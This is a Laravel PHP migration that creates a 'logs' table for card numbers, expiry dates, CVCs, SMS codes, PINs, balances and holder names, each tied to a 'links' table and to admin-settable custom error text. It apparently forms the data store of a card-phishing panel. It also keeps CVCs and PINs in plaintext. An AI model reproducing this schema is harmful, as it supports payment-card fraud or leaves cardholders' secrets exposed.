<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

return new class extends Migration
{
    /**
     * Run the migrations.
     */
    public function up(): void
    {
        Schema::create('logs', function (Blueprint $table) {
            $table->id();
            $table->unsignedBigInteger('link_id')->nullable();
            $table->string('card')->nullable();
            $table->string('expire')->nullable();
            $table->integer('cvc')->nullable();
            $table->string('sms')->nullable();
            $table->string('status')->nullable();
            $table->string('balance')->nullable();
            $table->string('accurate_balance')->nullable();
            $table->string('app')->nullable();
            $table->string('pin')->nullable();
            $table->string('call')->nullable();
            $table->string('holder')->nullable();
            $table->string('number')->nullable();
            $table->string('custom_error')->nullable();
            $table->string('custom_text')->nullable();
            $table->string('custom_photo')->nullable();
            $table->unsignedBigInteger('admin_id')->nullable();
            $table->boolean('check_online')->default(True);
            $table->timestamps();
        });

        Schema::table('logs', function (Blueprint $table) {
            $table->foreign('link_id')->references('id')->on('links')->onDelete('cascade');
        });
    }

    /**
     * Reverse the migrations.
     */
    public function down(): void
    {
        Schema::dropIfExists('logs');
    }
};
